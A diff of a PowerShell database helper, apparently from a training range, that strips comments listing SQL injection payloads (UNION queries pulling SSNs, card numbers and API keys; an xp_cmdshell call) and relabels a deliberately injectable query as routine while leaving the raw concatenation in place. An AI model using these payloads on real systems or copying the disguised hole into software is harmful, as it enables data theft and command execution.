@@ -1,21 +1,8 @@
 # ================================================================================
-# db_management.ps1  —  routine "customer search" maintenance helper for SecretsDb.
-# Left on ALPHA-SECRETS (C:\Scripts). With Domain Admin, the operator finds this
-# script and learns the SQL-injection entry point (Milestone 9.1): it calls the
-# NESTED vulnerable stored procedure dbo.usp_SearchCustomers.
+# db_management.ps1  —  customer-search maintenance helper for SecretsDb.
+# Runs the dbo.usp_SearchCustomers stored procedure for a given search term.
 #
 #   .\db_management.ps1 -SearchTerm "Portland"
-#
-# LAYERED SQLi PAYLOADS (pass as -SearchTerm; the value is concatenated into dynamic
-# SQL inside the procs, so these break out of the string):
-#   9.1/9.2  3-col outer UNION:
-#     %' UNION SELECT SecretId, SSN+'|'+CreditCardNumber, ApiKey FROM dbo.CustomerSecrets --
-#   9.3/9.4  2-col inner UNION (via the nested usp_LookupCity CALL):
-#     x' UNION SELECT CustomerId, SSN+'|'+CreditCardNumber+'|'+ApiKey FROM dbo.CustomerSecrets --
-#   cross-hop via the [SECRETS] loopback linked server:
-#     x' UNION SELECT EmpId, Name+'|'+SSN+'|'+ApiKey FROM [SECRETS].SecretsDb.dbo.Payroll --
-#   SQLi -> RCE (stacked; xp_cmdshell enabled):
-#     %'; EXEC xp_cmdshell 'whoami'; --
 # ================================================================================
 param(
     [string]$SearchTerm = "Portland"
@@ -26,7 +13,7 @@ $Database = "{{ alpha_sql_db_name }}"
 $User     = "{{ alpha_sql_login }}"
 $Password = "{{ alpha_sql_password }}"
 
-# The proc is called with the raw term embedded — this is the injectable sink.
+# Pass the search term to the stored procedure.
 $Query = "EXEC dbo.usp_SearchCustomers @SearchTerm = N'$SearchTerm';"
 
 Write-Host "[db_management] searching customers for '$SearchTerm' ..."
